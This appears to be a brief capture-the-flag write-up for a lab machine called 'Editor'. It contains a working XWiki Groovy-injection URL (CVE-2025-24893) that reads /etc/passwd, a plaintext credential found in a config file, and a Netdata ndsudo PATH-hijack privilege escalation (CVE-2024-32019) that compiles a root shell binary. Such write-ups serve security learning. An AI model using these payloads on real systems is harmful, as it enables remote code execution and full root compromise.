# Editor - XWiki / ndsudo PE

## CVE-2025-24893 - xwiki

### Proof of Concepts

```bash
{{BaseURL}}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20
```

[image]

## Configuration File

```bash
/etc/xwiki/hibernate.cfg.xml
```

[image]

## Shell as Oliver

```
username: oliver
password: theEd1t0rTeam99
```

## Shell as Root

**id** командаар `netdata` сервис ажиллаж байгааг олсон бөгөөд 19999 порт дээр ажилладаг юм байна.

[image]

**127.0.0.1 localhost port 19999**

[image]

## CVE-2024-32019

The `ndsudo` tool shipped with affected versions of the Netdata Agent allows an attacker to run arbitrary programs with root permissions.

### Proof of Concept

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/nvme.c

gcc /tmp/nvme.c -o /tmp/nvme

chmod +x nvme

export PATH=/tmp:$PATH

/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

[image]
